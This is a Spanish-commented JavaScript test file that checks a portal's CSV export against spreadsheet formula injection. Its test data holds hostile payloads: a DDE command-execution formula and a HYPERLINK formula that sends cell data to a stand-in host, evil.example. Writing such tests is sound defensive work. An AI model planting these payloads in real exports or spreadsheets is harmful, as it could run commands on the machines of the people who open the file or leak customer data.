/* ============================================================================
 * SEC-3c — el export CSV no deja pasar fórmulas.
 * Hallazgo 5 de misc/auditoria-seguridad-jul28.html. Spec: misc/spec-sec3c-csv-injection.md.
 *
 * toCSV escapaba la SINTAXIS del CSV (comillas, comas, saltos) pero no el CONTENIDO:
 * una celda que empieza por = + - @ es una FÓRMULA para Excel/Sheets/LibreOffice, y los
 * nombres vienen del propio cliente (update-profile solo valida longitud). El archivo lo
 * abre un admin de RAP o un dealer, y lleva PII.
 * Se prueba el punto único (toCSV) y el endpoint completo de export.
 * ==========================================================================*/
import { makeT } from './helpers.mjs';

const t = makeT('sec3c-csv-injection');

process.env.SUPABASE_URL = 'https://supa.test';
process.env.SUPABASE_SERVICE_ROLE_KEY = 'test-key';
const env = process.env;

const { toCSV } = await import('../../netlify/functions/_lib/portal.mjs');

/* Una sola columna para leer la celda sin ruido. */
const cell = (v) => toCSV([{ a: v }], [{ key: 'a', label: 'A' }]).split('\n')[1];

/* ── Las cuatro cabezas de fórmula clásicas ── */
{
  for (const [payload, nombre] of [
    ["=cmd|'/C calc'!A0", 'ejecución de comando vía DDE'],
    ['=HYPERLINK("https://evil.example/?d="&A1,"Click")', 'exfiltración por HYPERLINK'],
    ['+1+1', 'suma con +'],
    ['-1+1', 'resta con -'],
    ['@SUM(1+1)', 'macro con @']
  ]) {
    const out = cell(payload);
    t(out.startsWith("'") || out.startsWith('"\''), `neutraliza ${nombre}: la celda ya no arranca por el carácter de fórmula`);
    t(out.includes(payload.replace(/"/g, '""')), `neutraliza ${nombre}: el dato original se conserva íntegro (no se recorta)`);
  }
}

/* ── Tabulador y retorno de carro: también disparan fórmula y además rompen el archivo ── */
{
  const tab = cell('\t=1+1');
  t(tab.startsWith("'") || tab.startsWith('"\''), 'neutraliza la celda que empieza por tabulador');
  const cr = cell('\r=1+1');
  t(cr.startsWith("'") || cr.startsWith('"\''), 'neutraliza la celda que empieza por retorno de carro');

  const conCR = cell('Jane\rDoe');
  t(conCR.startsWith('"') && conCR.endsWith('"'), 'un \\r en medio va ENTRECOMILLADO (antes partía la fila y desplazaba columnas)');
  const conTab = cell('Jane\tDoe');
  t(conTab.startsWith('"') && conTab.endsWith('"'), 'un \\t en medio va entrecomillado');
}

/* ── Con espacios delante también se evalúa (las hojas recortan el campo) ── */
{
  const out = cell('   =1+1');
  t(out.replace(/^"/, '').startsWith("'"), 'neutraliza aunque el carácter peligroso venga tras espacios');
  const outTab = cell(' \t @SUM(1)');
  t(outTab.replace(/^"/, '').startsWith("'"), 'neutraliza con mezcla de espacios y tabuladores por delante');
}

/* ── Lo normal NO se toca: byte a byte igual que antes ── */
{
  for (const v of [
    'Jane', 'Doe', "O'Brien", 'Núñez-Gómez', 'Protection', 'Protection+',
    'RX-10017-12', '2026-07-28', '12', 'active', 'cancelled', 'ASSOC-7', 'jane@example.com'
  ]) t(cell(v) === v, `valor legítimo intacto: ${JSON.stringify(v)}`);

  t(cell('Smith-Jones') === 'Smith-Jones', 'el guion EN MEDIO no se toca (solo importa el primer carácter)');
  t(cell('A+B') === 'A+B', 'el + EN MEDIO no se toca');
  t(cell('a@b.co') === 'a@b.co', 'la arroba EN MEDIO no se toca (los emails salen limpios)');
}

/* ── El escape de siempre sigue exactamente igual ── */
{
  t(cell('x,y') === '"x,y"', 'comas: sigue entrecomillando');
  t(cell('Bo "B"') === '"Bo ""B"""', 'comillas: sigue doblándolas');
  /* el salto de línea se comprueba sobre el CSV entero: `cell` parte por \n a propósito */
  t(toCSV([{ a: 'linea1\nlinea2' }], [{ key: 'a', label: 'A' }]) === 'A\n"linea1\nlinea2"',
    'salto de línea: sigue entrecomillando');
  t(cell(null) === '', 'null → celda vacía');
  t(cell(undefined) === '', 'undefined → celda vacía');
  t(cell(0) === '0', 'el cero NO se convierte en vacío');
  t(cell(false) === 'false', 'los no-strings se serializan como antes');

  /* Payload que además lleva comillas: se neutraliza Y se escapa. */
  const mixto = cell('=HYPERLINK("a","b")');
  t(mixto.startsWith('"') && mixto.endsWith('"'), 'payload con comillas: va entrecomillado');
  t(mixto.includes('""a""'), 'payload con comillas: las comillas internas siguen doblándose');
  t(mixto.includes("'="), 'payload con comillas: y además queda neutralizado');
}

/* ── La forma del archivo no cambia ── */
{
  const csv = toCSV(
    [{ a: 'Jane', b: 'x,y' }, { a: 'Bo "B"', b: '2' }],
    [{ key: 'a', label: 'Name' }, { key: 'b', label: 'Val' }]
  );
  t(csv === 'Name,Val\nJane,"x,y"\n"Bo ""B""",2', 'CSV completo: byte a byte idéntico al de antes del cambio');

  const head = toCSV([], [{ key: 'a', label: 'First' }, { key: 'b', label: 'Contract #' }]);
  t(head.split('\n')[0] === 'First,Contract #', 'cabeceras intactas (ninguna empieza por carácter peligroso)');
  t(toCSV(null, [{ key: 'a', label: 'A' }]) === 'A\n', 'sin filas: solo la cabecera, como antes');
}

/* ── End-to-end: el endpoint de export entrega el CSV ya neutralizado ── */
{
  let audit = null;
  globalThis.fetch = async (url, opts) => {
    const u = String(url);
    if (u.includes('/auth/v1/user')) {
      return new Response(JSON.stringify({
        id: 'u1', email: 'admin@raptns.com',
        app_metadata: { portal_role: 'dealer', org_id: 'org-1', org_name: 'Mío' }, user_metadata: {}
      }), { status: 200 });
    }
    if (u.includes('/rest/v1/audit')) { audit = JSON.parse(opts.body); return new Response('[]', { status: 201 }); }
    if (u.includes('/rest/v1/subscriptions')) {
      return new Response(JSON.stringify([{
        id: 's1', master_no: 'RX-10017', tier: 'stain_mech', kind: 'protection', status: 'active',
        started_at: '2026-01-15T00:00:00Z', canceled_at: null, sub_entity_id: null,
        sales_associate: '=1+1',                                  // el asociado lo teclea el kiosk
        profiles: { full_name: "=cmd|'/C calc'!A0 Doe", email: 'j@x.co' }   // el nombre lo pone el cliente
      }]), { status: 200 });
    }
    if (u.includes('/rest/v1/dealers')) return new Response('[]', { status: 200 });
    return new Response('[]', { status: 200 });
  };

  const handler = (await import('../../netlify/functions/portal-exports.mjs')).default;
  const res = await handler(new Request('https://portal.test/api/portal-exports', {
    method: 'POST', headers: { Authorization: 'Bearer tok', 'Content-Type': 'application/json' }, body: '{}'
  }));
  const d = await res.json();

  t(res.status === 200 && d.ok === true, 'export: sigue devolviendo 200 ok');
  t(d.filename === 'subscribers.csv' && d.rows === 1, 'export: mismo nombre de archivo y mismo conteo de filas');
  const linea = String(d.csv).split('\n')[1];
  t(!/(^|,)=cmd/.test(linea), 'export: el nombre del cliente ya NO llega como fórmula al Excel del admin');
  t(!/(^|,)=1\+1/.test(linea), 'export: el asociado tecleado en el kiosk tampoco');
  t(linea.includes('RX-10017'), 'export: los datos legítimos siguen ahí (el contrato)');
  t(linea.includes('Protection+'), 'export: y el programa, con su + intacto');
  t(!!audit && /PII included/.test(JSON.stringify(audit)), 'export: la fila de auditoría se sigue escribiendo igual');
}

t.done();
